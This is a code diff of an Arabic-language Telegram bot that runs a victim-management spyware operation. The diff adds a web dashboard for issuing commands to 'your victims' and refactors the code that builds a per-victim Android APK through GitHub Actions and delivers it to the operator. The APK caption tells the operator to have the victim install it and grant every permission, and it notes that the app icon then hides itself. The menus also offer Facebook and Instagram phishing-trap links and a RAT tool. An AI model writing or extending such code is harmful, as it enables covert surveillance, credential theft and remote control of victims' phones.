@@ -1,7 +1,7 @@
 # bot_handlers.py
 # ============================================================
 # معالجات البوت الرئيسية: /start + callback + step handlers
-# v3 — مع APK Manager + كل الأوامر الجديدة
+# v4 — مع Web Dashboard + APK Manager
 # ============================================================
 
 import io
@@ -72,6 +72,13 @@ def main_menu(user_id=None):
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("👥 إدارة الضحايا", callback_data="v_list"))
     markup.add(InlineKeyboardButton("📱 تطبيق الضحية (APK)", callback_data="v_new"))
+
+    # 🌐 زر لوحة التحكم الويب (جديد)
+    markup.add(InlineKeyboardButton(
+        "🌐 لوحة التحكم (ويب)",
+        callback_data="open_dashboard"
+    ))
+
     markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
     markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
     markup.add(InlineKeyboardButton("📱 أداة المراقبة والتحكم الخلفي", callback_data="gen_rat"))
@@ -235,7 +242,8 @@ def start_command(message):
         text = (
             f"⚡ <b>مرحباً {h(user_name)}</b>\n\n"
             f"🎯 نظام إدارة الضحايا\n\n"
-            f"📱 اضغط <b>إدارة الضحايا</b> للبدء"
+            f"📱 اضغط <b>إدارة الضحايا</b> للبدء\n"
+            f"🌐 أو افتح <b>لوحة التحكم</b> من الزر"
         )
 
     bot.send_message(
@@ -243,6 +251,57 @@ def start_command(message):
         parse_mode="HTML",
         reply_markup=main_menu(message.from_user.id)
     )
+
+
+# ============================================================
+# /dashboard
+# ============================================================
+@bot.message_handler(commands=['dashboard', 'dash', 'panel_web', 'web'])
+def dashboard_command(message):
+    """أمر سريع لفتح الـ Dashboard"""
+    chat_id = message.chat.id
+    user_id = message.from_user.id
+
+    logger.info(f"/dashboard from {user_id}")
+
+    try:
+        # تأكد إن المستخدم مسجل
+        get_or_create_user(
+            user_id,
+            message.from_user.username or "Unknown",
+            message.from_user.first_name or "User"
+        )
+
+        from web_dashboard import generate_magic_link
+
+        link = generate_magic_link(user_id)
+
+        if not link:
+            bot.send_message(chat_id, "❌ فشل توليد الرابط، حاول مرة أخرى")
+            return
+
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("🚀 ادخل لوحة التحكم", url=link))
+
+        bot.send_message(
+            chat_id,
+            "🌐 <b>لوحة التحكم الويب</b>\n"
+            "━━━━━━━━━━━━━━━━━━\n\n"
+            "⏰ <i>الرابط صالح لمدة 5 دقائق فقط</i>\n"
+            "🛡️ <i>لا تشاركه مع أي شخص</i>\n\n"
+            "💡 <b>يحتوي على:</b>\n"
+            "• قائمة ضحاياك مع الحالة\n"
+            "• إرسال أوامر مباشرة\n"
+            "• إحصائيات مفصلة\n"
+            "• جلسات LSH النشطة",
+            parse_mode="HTML",
+            reply_markup=markup
+        )
+        logger.info(f"Dashboard link sent to {user_id}")
+
+    except Exception as e:
+        logger.exception(f"dashboard_command error: {e}")
+        bot.send_message(chat_id, f"❌ خطأ: {h(str(e)[:100])}", parse_mode="HTML")
 
 
 # ============================================================
@@ -265,6 +324,46 @@ def _handle_callback(call, chat_id, user_id, data):
     """المنطق الفعلي للـ callback"""
 
     # ============================================================
+    # 🌐 فتح Dashboard
+    # ============================================================
+    if data == "open_dashboard":
+        bot.answer_callback_query(call.id, "🔄 جاري تجهيز الرابط...")
+
+        try:
+            from web_dashboard import generate_magic_link
+
+            link = generate_magic_link(user_id)
+
+            if not link:
+                bot.send_message(chat_id, "❌ فشل توليد الرابط، حاول مرة أخرى")
+                return
+
+            markup = InlineKeyboardMarkup()
+            markup.add(InlineKeyboardButton("🚀 ادخل لوحة التحكم", url=link))
+
+            bot.send_message(
+                chat_id,
+                "🔐 <b>رابط الدخول للوحة التحكم</b>\n"
+                "━━━━━━━━━━━━━━━━━━\n"
+                "⏰ <i>الرابط صالح لمدة 5 دقائق فقط</i>\n"
+                "🛡️ <i>لا تشاركه مع أي شخص</i>\n\n"
+                "💡 <b>يحتوي على:</b>\n"
+                "• قائمة ضحاياك مع الحالة\n"
+                "• إرسال أوامر مباشرة\n"
+                "• إحصائيات مفصلة\n"
+                "• جلسات LSH النشطة",
+                parse_mode="HTML",
+                reply_markup=markup
+            )
+            logger.info(f"Dashboard link sent to {user_id}")
+
+        except Exception as e:
+            logger.exception(f"open_dashboard error: {e}")
+            bot.send_message(chat_id, f"❌ خطأ: {h(str(e)[:100])}", parse_mode="HTML")
+
+        return
+
+    # ============================================================
     # قائمة الضحايا
     # ============================================================
     if data == "v_list":
@@ -273,6 +372,7 @@ def _handle_callback(call, chat_id, user_id, data):
 
         m = InlineKeyboardMarkup()
         m.add(InlineKeyboardButton("➕ ضحية جديدة (APK)", callback_data="v_new"))
+        m.add(InlineKeyboardButton("🌐 فتح لوحة التحكم (ويب)", callback_data="open_dashboard"))
 
         if victims:
             m.add(InlineKeyboardButton(
@@ -604,6 +704,68 @@ def _handle_callback(call, chat_id, user_id, data):
             return
 
         bot.answer_callback_query(call.id, f"❓ {action_key}", show_alert=True)
+        return
+
+    # ============================================================
+    # اختيار موقع الضحية (بعد إدخال الاسم)
+    # ============================================================
+    if data.startswith("victim_site_"):
+        site = data.replace("victim_site_", "")
+        bot.answer_callback_query(call.id, "⏳ جاري التجهيز...")
+
+        # استرجع الاسم من Redis
+        pending_name = None
+        if redis_client:
+            try:
+                pending_name = redis_client.get(f"pending_victim_name:{chat_id}")
+                if pending_name:
+                    redis_client.delete(f"pending_victim_name:{chat_id}")
+            except Exception as e:
+                logger.warning(f"redis get pending_victim_name error: {e}")
+
+        if not pending_name:
+            bot.send_message(chat_id, "❌ انتهت صلاحية العملية، ابدأ من جديد")
+            return
+
+        # حمّل الشاشة بالطريقة التقليدية: أرسل رسالة انتظار ثم ابدأ
+        wait_msg = bot.send_message(
+            chat_id,
+            f"⏳ <b>جاري تجهيز APK لـ</b> <code>{h(pending_name)}</code>\n\n"
+            f"🎯 الموقع: <code>{h(site)}</code>\n\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"🔨 <i>بناء التطبيق في GitHub Actions</i>\n"
+            f"⏱️ <i>الوقت المتوقع: 2-4 دقائق</i>",
+            parse_mode="HTML"
+        )
+
+        # أنشئ الضحية مع الموقع
+        victim = create_victim(chat_id, pending_name, site)
+
+        if not victim:
+            try:
+                bot.edit_message_text(
+                    "❌ فشل إنشاء الضحية",
+                    chat_id=chat_id, message_id=wait_msg.message_id
+                )
+            except Exception as e:
+                logger.warning(f"edit_message_text error: {e}")
+            return
+
+        victim_token = victim.get("victim_token")
+        victim_id = victim.get("victim_id")
+
+        logger.info(f"Victim created: {pending_name} | site={site} | {victim_id}")
+
+        # نفذ البناء في thread منفصل
+        def build_and_send():
+            _build_and_send_apk(
+                chat_id=chat_id,
+                victim_name=pending_name,
+                victim_token=victim_token,
+                wait_msg_id=wait_msg.message_id,
+            )
+
+        threading.Thread(target=build_and_send, daemon=True).start()
         return
 
     # ============================================================
@@ -1169,6 +1331,107 @@ def _handle_callback(call, chat_id, user_id, data):
 
 
 # ============================================================
+# Build & Send APK — دالة مساعدة
+# ============================================================
+def _build_and_send_apk(chat_id, victim_name, victim_token, wait_msg_id):
+    """يبني APK ويرسله للبوت (في thread منفصل)"""
+    if not GITHUB_TOKEN:
+        try:
+            bot.edit_message_text(
+                f"⚠️ <b>GITHUB_TOKEN غير مضبوط</b>\n\n"
+                f"🔑 <b>كود الضحية:</b>\n<code>{h(victim_token)}</code>\n\n"
+                f"📋 ثبّت APK عام وأدخل الكود يدوياً",
+                chat_id=chat_id, message_id=wait_msg_id,
+                parse_mode="HTML"
+            )
+        except Exception as e:
+            logger.warning(f"edit_message_text error: {e}")
+        return
+
+    success = trigger_victim_apk_build(victim_token, victim_name)
+
+    if not success:
+        try:
+            bot.edit_message_text(
+                f"❌ <b>فشل تشغيل البناء</b>\n\n"
+                f"🔑 التوكن: <code>{h(victim_token[:32])}</code>",
+                chat_id=chat_id, message_id=wait_msg_id,
+                parse_mode="HTML"
+            )
+        except Exception as e:
+            logger.warning(f"edit_message_text error: {e}")
+        return
+
+    try:
+        bot.edit_message_text(
+            f"✅ <b>تم تشغيل البناء بنجاح</b>\n\n"
+            f"⏳ <i>جاري انتظار GitHub Actions...</i>\n"
+            f"🆔 Token: <code>{h(victim_token[:16])}</code>\n"
+            f"⏱️ <i>الوقت المتوقع: 2-5 دقائق</i>",
+            chat_id=chat_id, message_id=wait_msg_id,
+            parse_mode="HTML"
+        )
+    except Exception as e:
+        logger.warning(f"edit progress error: {e}")
+
+    apk_url = get_victim_apk_url(victim_token, max_wait=900)
+
+    if not apk_url:
+        try:
+            bot.edit_message_text(
+                f"⏰ <b>انتهت مهلة الانتظار</b>\n\n"
+                f"👤 <code>{h(victim_name)}</code>\n"
+                f"🔗 تحقق يدوياً:\n"
+                f"https://github.com/{GITHUB_REPO}/releases",
+                chat_id=chat_id, message_id=wait_msg_id,
+                parse_mode="HTML",
+                disable_web_page_preview=True
+            )
+        except Exception as e:
+            logger.warning(f"edit_message_text error: {e}")
+        return
+
+    try:
+        r = requests.get(apk_url, timeout=120, allow_redirects=True)
+
+        if r.status_code == 200 and len(r.content) > 10000:
+            apk_buffer = io.BytesIO(r.content)
+            apk_buffer.name = f"Victim_{victim_name}.apk"
+
+            try:
+                bot.delete_message(chat_id, wait_msg_id)
+            except Exception:
+                pass
+
+            bot.send_document(
+                chat_id, apk_buffer,
+                caption=(
+                    f"✅ <b>APK جاهز للضحية</b> <code>{h(victim_name)}</code>\n"
+                    f"━━━━━━━━━━━━━━━━━━\n\n"
+                    f"📋 <b>الخطوات:</b>\n"
+                    f"1. أرسل APK للضحية\n"
+                    f"2. تثبّته على تليفونها\n"
+                    f"3. <b>تفتحه وتوافق على كل الصلاحيات</b>\n"
+                    f"4. تختفي الأيقونة بعد 5 ثواني\n"
+                    f"5. <b>هتظهر تلقائياً في ضحاياك</b> ✅\n\n"
+                    f"🎛️ <b>بعد كده:</b> ارجع → إدارة الضحايا → اضغط عليها"
+                ),
+                parse_mode="HTML"
+            )
+            logger.info(f"APK sent: {victim_name}")
+        else:
+            bot.send_message(
+                chat_id,
+                f"❌ فشل تحميل APK\n🔗 {h(apk_url)}",
+                disable_web_page_preview=True,
+                parse_mode="HTML"
+            )
+    except Exception as e:
+        logger.exception(f"APK download error: {e}")
+        bot.send_message(chat_id, f"❌ خطأ التحميل: {h(str(e))}", parse_mode="HTML")
+
+
+# ============================================================
 # Step Handlers
 # ============================================================
 
@@ -1207,103 +1470,11 @@ def victim_name_step(message):
 
     logger.info(f"Victim created: {victim_name} | {victim_id} | token={victim_token[:16]}")
 
-    def build_and_send():
-        if not GITHUB_TOKEN:
-            try:
-                bot.edit_message_text(
-                    f"⚠️ <b>GITHUB_TOKEN غير مضبوط</b>\n\n"
-                    f"🔑 <b>كود الضحية:</b>\n<code>{h(victim_token)}</code>\n\n"
-                    f"📋 ثبّت APK عام وأدخل الكود يدوياً",
-                    chat_id=chat_id, message_id=wait_msg.message_id,
-                    parse_mode="HTML"
-                )
-            except Exception as e:
-                logger.warning(f"edit_message_text error: {e}")
-            return
-
-        success = trigger_victim_apk_build(victim_token, victim_name)
-
-        if not success:
-            try:
-                bot.edit_message_text(
-                    f"❌ <b>فشل تشغيل البناء</b>\n\n"
-                    f"🔑 التوكن: <code>{h(victim_token[:32])}</code>",
-                    chat_id=chat_id, message_id=wait_msg.message_id,
-                    parse_mode="HTML"
-                )
-            except Exception as e:
-                logger.warning(f"edit_message_text error: {e}")
-            return
-
-        try:
-            bot.edit_message_text(
-                f"✅ <b>تم تشغيل البناء بنجاح</b>\n\n"
-                f"⏳ <i>جاري انتظار GitHub Actions...</i>\n"
-                f"🆔 Token: <code>{h(victim_token[:16])}</code>\n"
-                f"⏱️ <i>الوقت المتوقع: 2-5 دقائق</i>",
-                chat_id=chat_id, message_id=wait_msg.message_id,
-                parse_mode="HTML"
-            )
-        except Exception as e:
-            logger.warning(f"edit progress error: {e}")
-
-        apk_url = get_victim_apk_url(victim_token, max_wait=900)
-
-        if not apk_url:
-            try:
-                bot.edit_message_text(
-                    f"⏰ <b>انتهت مهلة الانتظار</b>\n\n"
-                    f"👤 <code>{h(victim_name)}</code>\n"
-                    f"🔗 تحقق يدوياً:\n"
-                    f"https://github.com/{GITHUB_REPO}/releases",
-                    chat_id=chat_id, message_id=wait_msg.message_id,
-                    parse_mode="HTML",
-                    disable_web_page_preview=True
-                )
-            except Exception as e:
-                logger.warning(f"edit_message_text error: {e}")
-            return
-
-        try:
-            r = requests.get(apk_url, timeout=120, allow_redirects=True)
-
-            if r.status_code == 200 and len(r.content) > 10000:
-                apk_buffer = io.BytesIO(r.content)
-                apk_buffer.name = f"Victim_{victim_name}.apk"
-
-                try:
-                    bot.delete_message(chat_id, wait_msg.message_id)
-                except Exception:
-                    pass
-
-                bot.send_document(
-                    chat_id, apk_buffer,
-                    caption=(
-                        f"✅ <b>APK جاهز للضحية</b> <code>{h(victim_name)}</code>\n"
-                        f"━━━━━━━━━━━━━━━━━━\n\n"
-                        f"📋 <b>الخطوات:</b>\n"
-                        f"1. أرسل APK للضحية\n"
-                        f"2. تثبّته على تليفونها\n"
-                        f"3. <b>تفتحه وتوافق على كل الصلاحيات</b>\n"
-                        f"4. تختفي الأيقونة بعد 5 ثواني\n"
-                        f"5. <b>هتظهر تلقائياً في ضحاياك</b> ✅\n\n"
-                        f"🎛️ <b>بعد كده:</b> ارجع → إدارة الضحايا → اضغط عليها"
-                    ),
-                    parse_mode="HTML"
-                )
-                logger.info(f"APK sent: {victim_name}")
-            else:
-                bot.send_message(
-                    chat_id,
-                    f"❌ فشل تحميل APK\n🔗 {h(apk_url)}",
-                    disable_web_page_preview=True,
-                    parse_mode="HTML"
-                )
-        except Exception as e:
-            logger.exception(f"APK download error: {e}")
-            bot.send_message(chat_id, f"❌ خطأ التحميل: {h(str(e))}", parse_mode="HTML")
-
-    threading.Thread(target=build_and_send, daemon=True).start()
+    threading.Thread(
+        target=_build_and_send_apk,
+        args=(chat_id, victim_name, victim_token, wait_msg.message_id),
+        daemon=True
+    ).start()
 
 
 # ============================================================
@@ -1380,6 +1551,9 @@ def victim_name_handler(message):
     markup.row(
         InlineKeyboardButton("🎵 TikTok", callback_data="victim_site_tiktok"),
         InlineKeyboardButton("🐦 Twitter/X", callback_data="victim_site_twitter"),
+    )
+    markup.row(
+        InlineKeyboardButton("📱 تطبيق عام (General)", callback_data="victim_site_general"),
     )
 
     bot.send_message(
